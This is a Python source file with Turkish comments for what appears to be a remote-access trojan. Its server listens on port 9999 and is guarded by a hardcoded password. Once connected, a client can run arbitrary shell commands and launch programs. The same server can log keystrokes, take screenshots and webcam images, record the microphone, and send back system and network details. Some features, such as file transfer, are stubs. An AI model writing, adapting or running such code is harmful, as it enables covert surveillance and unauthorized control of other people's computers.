import socket
import os
import psutil
import platform
import time
import pyautogui
import subprocess
import threading
import keyboard
import cv2
import numpy as np
import pyttsx3
import wave
import pyaudio
import datetime

SECRET_PASSWORD = "benimlabimsifresi"

# Ekran Görüntüsü Al
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        return f.read()

# Sistem Bilgileri Al
def get_system_info():
    uname_info = platform.uname()
    sys_info = f"System: {uname_info.system}\nNode Name: {uname_info.node}\nRelease: {uname_info.release}\nVersion: {uname_info.version}\nMachine: {uname_info.machine}\nProcessor: {uname_info.processor}"
    return sys_info

# CPU Bilgisi Al
def get_cpu_info():
    cpu_info = f"CPU Usage: {psutil.cpu_percent(interval=1)}%"
    return cpu_info

# USB Cihazlarını Listele
def list_usb_devices():
    usb_devices = []
    for part in psutil.disk_partitions():
        if 'usb' in part.opts:
            usb_devices.append(part.device)
    return "\n".join(usb_devices) if usb_devices else "No USB devices found."

# Bağlantı Bilgilerini Al
def get_connection_info():
    net_info = psutil.net_if_addrs()
    connections = []
    for interface, addrs in net_info.items():
        for addr in addrs:
            connections.append(f"{interface}: {addr.address}")
    return "\n".join(connections)

# Ağ Trafiği İzleme
def capture_network_traffic():
    # Basit ağ trafiği örneği; daha derinlemesine izleme yapmak için tcpdump veya benzeri araçlar gerekebilir.
    traffic_info = "Network traffic monitoring not implemented."
    return traffic_info

# Mikrofon Dinleme
def capture_microphone():
    # Mikrofonu kaydetme işlevi
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for i in range(0, int(44100 / 1024 * 5)):  # 5 saniyelik kayıt
        data = stream.read(1024)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # WAV dosyasına kaydedelim
    filename = "microphone_recording.wav"
    wf = wave.open(filename, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()

    return f"Microphone recording saved as {filename}"

# Klavye Dinleme
def keylogger():
    log = []
    print("Keylogger started...")
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                log.append(event.name)
                if len(log) >= 100:
                    break
    except KeyboardInterrupt:
        pass

    return "Keylog: " + ", ".join(log)

# Web Kamera Görüntüsü Alma
def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    filename = "webcam_capture.png"
    cv2.imwrite(filename, frame)
    cap.release()
    return filename

# Program Çalıştırma
def run_program(program_name):
    try:
        subprocess.Popen(program_name)
        return f"{program_name} started successfully."
    except Exception as e:
        return f"Failed to start {program_name}: {str(e)}"

# Dosya Transferi
def file_transfer(command):
    # Dosya indirme veya yükleme işlemi
    return "File transfer not implemented."

# Logları Görüntüleme
def view_logs():
    return "\n".join(open("/var/log/syslog").readlines())

# Client ile Bağlantı
def handle_client(client_socket):
    password = client_socket.recv(1024).decode()
    if password != SECRET_PASSWORD:
        client_socket.send("Authentication failed!".encode())
        client_socket.close()
        return

    client_socket.send("Authentication successful!".encode())

    while True:
        option = client_socket.recv(1024).decode()
        if option == "1":
            command = client_socket.recv(1024).decode()
            result = subprocess.getoutput(command)
            client_socket.send(result.encode())
        elif option == "2":
            screenshot = capture_screenshot()
            client_socket.send(screenshot)
        elif option == "3":
            system_info = get_system_info()
            client_socket.send(system_info.encode())
        elif option == "4":
            cpu_info = get_cpu_info()
            client_socket.send(cpu_info.encode())
        elif option == "5":
            usb_devices = list_usb_devices()
            client_socket.send(usb_devices.encode())
        elif option == "6":
            connection_info = get_connection_info()
            client_socket.send(connection_info.encode())
        elif option == "7":
            network_traffic = capture_network_traffic()
            client_socket.send(network_traffic.encode())
        elif option == "8":
            keylog = keylogger()
            client_socket.send(keylog.encode())
        elif option == "9":
            webcam_filename = capture_webcam()
            with open(webcam_filename, "rb") as f:
                client_socket.send(f.read())
        elif option == "10":
            program_name = client_socket.recv(1024).decode()
            result = run_program(program_name)
            client_socket.send(result.encode())
        elif option == "11":
            logs = view_logs()
            client_socket.send(logs.encode())
        elif option == "12":
            file_transfer_command = client_socket.recv(1024).decode()
            result = file_transfer(file_transfer_command)
            client_socket.send(result.encode())
        elif option == "13":
            microphone_recording = capture_microphone()
            client_socket.send(microphone_recording.encode())
        elif option == "14":
            client_socket.send("Application closing.".encode())
            break
        elif option == "15":
            client_socket.send("Exiting...".encode())
            break

    client_socket.close()

def start_server():
    server_ip = "0.0.0.0"
    server_port = 9999
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)

    print(f"Server listening on {server_ip}:{server_port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address} established.")
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    start_server()
